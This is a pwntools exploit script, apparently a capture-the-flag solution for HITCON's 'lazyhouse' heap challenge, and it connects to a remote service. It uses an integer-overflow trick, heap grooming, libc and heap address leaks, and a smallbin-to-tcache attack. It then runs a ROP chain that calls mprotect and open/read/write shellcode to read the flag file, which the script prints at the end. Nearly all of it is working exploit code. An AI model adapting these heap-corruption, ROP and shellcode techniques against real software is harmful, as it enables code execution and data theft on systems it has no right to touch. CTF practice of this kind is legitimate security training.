from pwn import *

# context.log_level = 'debug'
context.arch = "amd64"

# p = process("./lazyhouse")
p = remote("3.115.121.123", 5731)

def buyhouse(idx, sz, s):
    p.recvuntil(": ")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("Size:")
    p.sendline(str(sz))
    p.recvuntil("House:")
    p.sendline(s)

def showhouse(idx):
    p.recvuntil(": ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def sellhouse(idx):
    p.recvuntil(": ")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def uphouse(idx, s):
    p.recvuntil(": ")
    p.sendline("4")
    p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("House:")
    p.sendline(s)

p.recvuntil(": ")
p.sendline("1")
p.recvuntil("Index:")
p.sendline(str(0))
p.recvuntil("Size:")
p.sendline(str(0x12c9fb4d812ca00))

sellhouse(0)        # MONEY MONEY $$$$

for i in range(6):
    buyhouse(i, 0x80, "A"*0x80)
    sellhouse(i)

for i in range(5):
    buyhouse(i, 0x210, "A"*0x210)
    sellhouse(i)

# for i in range(7):
#     buyhouse(i, 0x400, "A"*0x400)
#     sellhouse(i)

for i in range(7):
    buyhouse(i, 0x300, "A"*0x300)
    sellhouse(i)

buyhouse(0, 0x80, "A"*8)
buyhouse(1, 0x300, "A"*8)
buyhouse(2, 0x300, "A"*0x2f8 + p64(0xa1))
buyhouse(3, 0x80, "A"*8)
sellhouse(3)

z = ''
z += 'A'*0x88
z += p64(0x611)
uphouse(0, z)

sellhouse(1)

buyhouse(1, 0x600, "A"*0x300 + p64(0) + p64(0x311))

sellhouse(2)
sellhouse(0)

showhouse(1)
p.recv(0x310)
libcleak = u64(p.recv(8)) - 0x1e4ca0
heapleak = u64(p.recv(8)) - 0x49a0 + 0x23e0
log.info("%#x", libcleak)
log.info("%#x", heapleak)

buyhouse(7, 0xe0, "F"*8)
sellhouse(7)
buyhouse(7, 0x3f0, "D"*8)
sellhouse(7)

libcbase = libcleak
# 0x0000000000026542: pop rdi; ret;
pop_rdi_ret = libcbase + 0x26542
# 0x0000000000026f9e: pop rsi; ret;
pop_rsi_ret = libcbase + 0x26f9e
# 0x000000000012bda6: pop rdx; ret;
pop_rdx_ret = libcbase + 0x12bda6
# 0x0000000000047cf8: pop rax; ret;
pop_rax_ret = libcbase + 0x47cf8
# 0x00000000000cf6c5: syscall; ret;
syscall_ret = libcbase + 0xcf6c5
#
ret = libcbase + 0x144fc2

buyhouse(0, 0x80, "C"*0x18 + p64(ret))

heapbase = heapleak
sellhouse(1)
buf = heapbase+0x2660
z = ""
# z += "./flag"
z += "/home/lazyhouse/flag"
z = z.ljust(0x20, "\x00")
z += p64(0)
z += p64(0x221)
z += p64(heapleak+0x2a50) # 0x46c0) # fd -- point to correct chunk
z += p64(libcleak+0x1e4a28) # 0x1e4c90) # bk -- first tcache entry we want
### rop
z += p64(0)
z += p64(pop_rdi_ret)
z += p64(heapbase)
z += p64(pop_rsi_ret)
z += p64(0x21000)
z += p64(pop_rdx_ret)
z += p64(0x7)
z += p64(pop_rax_ret)
z += p64(0xa)
z += p64(syscall_ret)
z += p64(heapbase+0x26f8)
z += "\x90"*16
z += asm("""
        mov rdi, 0x%x
        xor rsi, rsi
        mov eax, 2
        syscall

        cmp rax, 0
        jl fail

        mov rdi, rax
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        syscall

        xor rdi, rdi
        inc rdi
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        inc rax
        syscall

    loop:
        jmp loop
    fail:
        xor rdi, rdi
        inc rdi
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        inc rax
        syscall
        """ % (buf,heapbase,heapbase,buf))

z = z.ljust(0x3f0, "A")
z += p64(0)
z += p64(0x221)
z += p64(libcleak+0x1e4eb0) # fd -- small bin
z += p64(heapleak+0x2680) # 0x42f0) # bk -- point to fake chunk
buyhouse(1, 0x600, z)

buyhouse(2, 0x210, "B"*0x40)

p.recvuntil(": ")
p.sendline("5")
p.recvuntil(":")
p.send("A"*0x1f8 + p64(libcleak + 0x58373))

p.recvuntil(": ")
p.sendline("1")
p.recvuntil("Index:")
p.sendline("4")
p.recvuntil("Size:")
p.sendline(str(heapleak+0x26a0))

p.interactive()

# hitcon{from_sm4llbin_2_tc4hc3_from_tcach3_to_RCE}
